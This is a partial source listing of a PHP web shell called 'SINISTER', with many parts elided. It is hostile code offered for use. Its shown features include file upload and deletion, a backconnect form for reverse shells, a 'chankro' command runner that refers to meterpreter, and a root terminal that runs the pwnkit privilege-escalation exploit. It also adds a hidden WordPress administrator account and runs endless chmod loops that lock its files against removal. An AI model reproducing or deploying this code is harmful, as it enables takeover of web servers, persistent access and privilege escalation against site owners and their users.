...
$hashedPassword = "df65e4ee1c202d90f0b5fd36b839754b"; 
...
<head>
    ...
    <title>SINISTER [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <script src="https://cdn.tailwindcss.com"></script>
            ...
            <div class="p-4">
                ...
                <div class="mb-6">
                    ...
                    <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>' class="mb-6">
                        <div class="flex items-center flex-wrap gap-2">
                            <input type="file" name="SINISTER-upload" class="hidden" id="file-upload">
                            ...
                            <button type="submit" name="SINISTER-up-submit" class="bg-teal-600 hover:bg-teal-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn cyber-btn-success">
                        ...
                        <form action="" method="post">
                            <div class="max-h-[60vh] overflow-y-auto">
                                ...
                                <div class="bg-slate-800 p-3 flex flex-wrap gap-3">
                                    <select name="SINISTER-select" class="bg-slate-700 text-white rounded px-3 py-1 text-sm flex-1 md:flex-none cyber-font">
    ...
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-md p-6 modal-content">
                ...
                <form action="" method="post">
                    <select name="SINISTER-bc" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3">
                ...
                <?php
                    if (isset($_POST['terminal-chankro'])) {
                        ...
                        if(isset($_POST['exechankro'])){
                            ...
                            $viewCommandResult = '<hr><p>Result: base64 : ' . $meterpreter .'</br>If no output appears, <br>please check manually by opening '.$full_url.'<br>Or u can check command with reverse shell script<br>Powered By @ SINISTER<br><br>';        
    ...
    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect cyber-panel rounded-lg w-full max-w-4xl h-[80vh] flex flex-col modal-content">
                ...
                if ($fungsi[3]('.SINISTER-root') && $fungsi[3]('pwnkit')) {
                    $response = $fungsi[11]('.SINISTER-root');
                    $r_text = explode(" ", $response);
                    echo "[+] Powered By SINISTER\n";
                    if (isset($r_text[0]) && $r_text[0] === "uid=0(root)") {
                        ...
                        if ($fungsi[3]('pwnkit32')) {
                            cmd('./pwnkit32 "id" > .SINISTER-root32');
                            if ($fungsi[3]('.SINISTER-root32')) {
                                $res2 = $fungsi[11]('.SINISTER-root32');
                                $rtxt2 = explode(" ", $res2);
                    ...
                    $fungsi[24]('.SINISTER-root');
                    $fungsi[24]('.SINISTER-root32');
                }
?>
...
if (isset($_POST['submitwp'])) {
    ...
    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'SINISTER', '', '', NOW(), '', 0, 'SINISTER')";
...
if (isset($_POST['submit-bc'])) {
    ...
    } else if ($_POST['SINISTER-bc'] == "python") {
...
while (True){
    ...
    if (SINISTER_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (SINISTER_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function SINISTER_perm($flename){
...
if (isset($_POST['SINISTER-up-submit'])) {
    $namaFilenya = $_FILES['SINISTER-upload']['name'];
    $tmpName = $_FILES['SINISTER-upload']['tmp_name'];
...
if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        ...
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit "id" > .SINISTER-root');
...
if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['SINISTER-select'] == "delete") {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); 
            $fd = $repl . "/" . $it;
    ...
    } else if ($_POST['SINISTER-select'] == 'unzip') {
        foreach ($items as $it) {
    ...
    } else if ($_POST['SINISTER-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
...
while (True){
    ...
    if (SINISTER_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (SINISTER_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}
